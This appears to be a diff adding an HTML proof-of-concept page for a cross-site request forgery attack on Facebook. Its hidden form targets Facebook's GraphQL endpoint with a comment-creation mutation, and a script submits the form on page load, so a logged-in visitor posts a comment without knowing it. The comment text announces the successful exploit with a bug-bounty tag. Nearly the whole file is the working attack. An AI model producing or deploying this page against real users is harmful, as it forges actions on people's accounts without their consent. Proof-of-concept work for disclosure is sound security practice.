@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook CSRF PoC</title>
+</head>
+<body>
+  <h2 style="display:none">PoC: Facebook Auto Comment via CSRF</h2>
+
+  <form id="csrfForm" action="https://www.facebook.com/api/graphql/" method="POST" enctype="application/x-www-form-urlencoded">
+    <input type="hidden" name="fb_api_caller_class" value="RelayModern">
+    <input type="hidden" name="fb_api_req_friendly_name" value="CometUFICreateCommentMutation">
+    <input type="hidden" name="doc_id" value="4761013103981064">
+    <input type="hidden" name="variables" value='{
+      "input":{
+        "comment_text":"🔥 تم استغلال ثغرة CSRF بنجاح! #BugBounty",
+        "feedback_id":"1366822471476006",
+        "client_mutation_id":"poc123456"
+      },
+      "feedbackSource":"NEWSFEED"
+    }'>
+  </form>
+
+  <script>
+    window.onload = function() {
+      document.getElementById('csrfForm').submit();
+    };
+  </script>
+</body>
+</html>
